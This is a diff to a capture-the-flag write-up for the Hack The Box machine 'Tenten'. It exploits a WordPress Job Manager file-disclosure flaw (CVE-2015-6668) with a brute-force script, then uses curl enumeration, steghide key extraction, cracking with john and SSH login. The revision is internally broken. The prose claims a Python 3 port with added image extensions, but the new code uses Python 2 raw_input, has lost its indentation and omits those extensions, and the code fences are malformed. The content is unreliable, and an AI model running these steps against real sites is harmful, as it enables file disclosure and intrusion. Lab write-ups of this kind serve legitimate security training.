@@ -84,10 +84,12 @@ The Job Manager plugin version 0.7.25 is vulnerable to a file disclosure attack 
 
 ### File Discovery Script
 
-Created a Python script to brute force file paths based on upload dates:
+The **Job Manager** WordPress plugin allows reading arbitrary files through predictable upload paths. While researching this plugin, I discovered that it is possible to brute-force file names and paths to enumerate uploaded files.
 
-```python
-#!/usr/bin/env python3
+I used an exploit script originally shared on [vagmour.eu](https://vagmour.eu) (accessed via the Wayback Machine). The script was written in Python 2, so I made a few modifications to make it compatible with **Python 3**. I also updated the date range in the `for` loop to match the post dates on `tenten.htb`, as they were outside the original script’s range. Additionally, I included image extensions (e.g., `.png`, `.jpg`) and `.zip` in the list of file types to increase the chance of finding interesting content.
+
+
+# exploit.py
 
 import requests
 
@@ -95,31 +97,55 @@ print("""
 CVE-2015-6668
 Title: CV filename disclosure on Job-Manager WP Plugin
 Author: Evangelos Mourikis
+Versions: <=0.7.25
 """)
 
-website = input('Enter a vulnerable website: ')
-filename = input('Enter a file name: ')
+website = raw_input('Enter a vulnerable website: ')
+filename = raw_input('Enter a file name: ')
+
 filename2 = filename.replace(" ", "-")
 
-for year in range(2013, 2018):
-    for i in range(1, 13):
-        for extension in ['doc', 'pdf', 'docx', 'jpg']:
-            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02d}".format(i) + "/" + filename2 + "." + extension
-            req = requests.get(URL)
-            if req.status_code == 200:
-                print("URL of CV found! " + URL)
-```
+for year in range(2017, 2023):
+for i in range(1, 13):
+for extension in {'doc', 'pdf', 'docx'}:
+URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
+req = requests.get(URL)
+if req.status_code == 200:
+print("[+] URL of CV found! " + URL)
 
-### Manual Enumeration
-
-Used a bash loop to enumerate job applications:
+We give the script execution permissions:
 
 ```bash
-for i in $(seq 1 20); do 
-    echo -n "$i: "; 
-    curl -sL http://tenten.htb/index.php/jobs/apply/$i/ | grep '<title>'; 
+chmod +x exploit.py
+
+Then, we run it using:
+
+```python3 exploit.py
+The script will prompt for the target website URL and the name of the file to search for.
+
+We found the file name by running a Bash script that performs iterative requests using `curl`.
+
+### Bash Script to Search for Uploaded Files
+
+```bash
+for i in $(seq 1 20); do
+  echo -n "$i: ";
+  curl -sL http://tenten.htb/index.php/jobs/apply/$i/ | grep '<title>';
 done
-```
+
+File Found
+File name: HackerAccessGranted.jpg
+
+Discovered on page: 13
+
+We run the exploit script again, this time using the file name `HackerAccessGranted` along with the website URL.
+
+The script successfully finds the file, and when we open the resulting URL, we get the following image:
+
+**Found:**  
+`/wp-content/uploads/2017/04/HackerAccessGranted.jpg`
+
+
 
 **Key Discovery:**
 * Found application: `HackerAccessGranted`
@@ -136,10 +162,11 @@ Downloaded and analyzed the suspicious image file:
 # Download the file
 wget http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
 
-# Check file type
-file HackerAccessGranted.jpg
+# Using the `info` parameter from `steghide`, we discover that the image contains a hidden RSA private key.
 
-# Extract hidden data using steghide
+To extract the hidden data using steghide, we use the following command:
+
+# Extract 
 steghide extract -sf HackerAccessGranted.jpg
 ```
 
@@ -168,6 +195,9 @@ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
 **Cracked Password:** `superpassword`
 ---
 ## SSH Access
+
+Using the recovered password, we can connect via SSH.  
+We authenticate with the `id_rsa` private key (whose passphrase we decrypted earlier) and the user `takis`.
 
 ```bash
 # Set proper permissions
